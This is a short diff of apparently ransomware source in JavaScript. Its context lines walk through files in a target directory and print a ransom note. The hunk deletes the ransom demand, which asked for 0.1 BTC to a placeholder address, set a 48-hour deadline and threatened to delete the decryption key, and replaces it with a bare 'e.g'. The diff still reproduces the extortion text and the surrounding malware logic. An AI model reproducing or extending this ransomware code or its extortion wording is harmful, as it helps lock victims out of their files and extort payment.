@@ -33,10 +33,7 @@ fs.readdirSync(targetDirectory).forEach(file => {
 // Display ransom note to user
 var ransomNote = `
 Your files have been encrypted!
-To decrypt your files, send 0.1 BTC to the following address:
-<Bitcoin_Address>
-Once payment is received, your files will be decrypted.
-If payment is not made within 48 hours, the encryption key will be deleted, and your files will be lost forever.
+e.g
 `;
 
 console.log(ransomNote);
